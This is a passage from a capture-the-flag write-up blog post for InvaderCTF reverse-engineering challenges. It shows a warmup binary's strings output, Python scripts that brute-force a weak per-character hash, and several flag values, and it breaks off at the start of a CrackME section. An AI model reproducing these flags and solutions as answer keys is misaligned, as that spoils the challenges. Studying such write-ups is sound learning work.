&lt;p&gt;I got the flag here but it says we have to do same process in the remote server to get the original flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;The original flag : InvaderCTF{Enjoy_the_fine_F1aG_d1sh_01212124}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;reverse-engineering-challenges&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse-engineering-challenges&quot; aria-label=&quot;Anchor link for: reverse-engineering-challenges&quot;&gt;Reverse Engineering Challenges&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;warmup&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#warmup&quot; aria-label=&quot;Anchor link for: warmup&quot;&gt;Warmup&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Really a simple warmup &lt;code&gt;*_~&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Warmup chall for beginners.
Can we get source back from compiled binary ?&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;I got a binary file within the challenge&lt;&#x2F;p&gt;
&lt;p&gt;Lets see the strings in the binary file&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; strings warmup
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;libc.so.6
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__isoc99_scanf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;puts
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__stack_chk_fail
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;printf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__cxa_finalize
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strcmp
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__libc_start_main
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GLIBC_2.7
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GLIBC_2.4
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GLIBC_2.2.5
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_ITM_deregisterTMCloneTable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;__gmon_start__
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_ITM_registerTMCloneTable
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;u+UH
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[]A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]A^A_
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;InvaderCTF{pl4in_t3xt_s3cr3ts_0n_cl1ent_s1d3_c0de&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; flag : 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;]%*c
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Yepp,&lt;&#x2F;span&gt;&lt;span&gt; It is correct :)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Submit&lt;&#x2F;span&gt;&lt;span&gt; in https:&#x2F;&#x2F;ctf.pwn.af
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Nope&lt;&#x2F;span&gt;&lt;span&gt; :(
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Wait..What...? Sorry i forgot that its a warmup &lt;code&gt;*_~&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag = InvaderCTF{pl4in_t3xt_s3cr3ts_0n_cl1ent_s1d3_c0de}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;py-encrypter&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#py-encrypter&quot; aria-label=&quot;Anchor link for: py-encrypter&quot;&gt;Py Encrypter&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;invaders22&#x2F;pyencrypter.png&quot; alt=&quot;Py encrypter&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The code in the given source file&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Two byte hash
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;myHash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;H4shS33d&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;string)
&lt;&#x2F;span&gt;&lt;span&gt;    num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(num)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;zfill&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encryptFlag&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;flag&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;        enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;myHash&lt;&#x2F;span&gt;&lt;span&gt;(char)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;enc
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter flag : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encryptFlag&lt;&#x2F;span&gt;&lt;span&gt;(flag)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Encrypted flag is : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;enc)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I know i have to reverse the hash to get the flag,but i did in a unintend way &lt;code&gt;-_-&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;unintend-solution&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#unintend-solution&quot; aria-label=&quot;Anchor link for: unintend-solution&quot;&gt;Unintend Solution&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;In the Challenge files they gave a hint that the flag is going to starts with &lt;code&gt;InvaderCTF{&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, i tried to get the hash of the &#x27;I&#x27; in using the given encryption script.
Its the first 4 chars of the encrypted flag. I decided to seperate the encrypted string into group of 4 chars.&lt;&#x2F;p&gt;
&lt;p&gt;Then i did the bruteforce &lt;code&gt;+_+&lt;&#x2F;code&gt;. Sorry author! But i got the flag ,haha.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Two byte hash
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;myHash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;H4shS33d&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;string)
&lt;&#x2F;span&gt;&lt;span&gt;    num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(num)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;zfill&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encryptFlag&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;flag&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;        enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;myHash&lt;&#x2F;span&gt;&lt;span&gt;(char)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;enc
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;brut &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;ABCDEFGHIJKLMNOPQRSTUVXYZabcdefghijklmnopqrstuvwxyz0123456789_&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1fb9,bdbf,bfa9,5295,262c,1fb9,17ac,7573,5295,6685,500e,bfa9,cf34,7573,d256,6685,bdbf,bfa9,cf34,bdbf,f2a3,0797,b15a,6685,6217,cf34,6685,0728,7573,262c,9082&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hash &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(brut)):
&lt;&#x2F;span&gt;&lt;span&gt;    enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encryptFlag&lt;&#x2F;span&gt;&lt;span&gt;(brut[i])
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span&gt;)):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span&gt;[j]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span&gt;[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;brut[i]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;InvaderCTF{&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;}&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : InvaderCTF{ch4ract3r_b4s3d_h4sh1ng_is_w3ak}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h3 id=&quot;intended-solution&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#intended-solution&quot; aria-label=&quot;Anchor link for: intended-solution&quot;&gt;Intended Solution&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;I have to do it in other way am i correct?&lt;&#x2F;p&gt;
&lt;p&gt;Here it is..&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;string
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;08ef07973844262cd256a8635295ad53ece7518ae30f1fb9bdbfbfa95295262c1fb917ac757352956685500ebfa9cf347573d2566685bdbfbfa9cf34bdbff2a30797b15a66856217cf34668507287573262c908276b5&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[flag[i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(flag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;flag:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;string&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;printable:
&lt;&#x2F;span&gt;&lt;span&gt;        random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;H4shS33d&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;i) 
&lt;&#x2F;span&gt;&lt;span&gt;        num &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(j&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt;num:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : InvaderCTF{ch4ract3r_b4s3d_h4sh1ng_is_w3ak}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;crackme&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crackme&quot; aria-label=&quot;Anchor link for: crackme&quot;&gt;CrackME&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;invaders22&#x2F;crack_me.png&quot; alt=&quot;Crack me&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the attached files they gave me a &lt;code&gt;crackme.pyc&lt;&#x2F;code&gt; binary file. I used a online decompiler
to get back the source code.&lt;&#x2F;p&gt;
&lt;p&gt;The source code of the binary file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
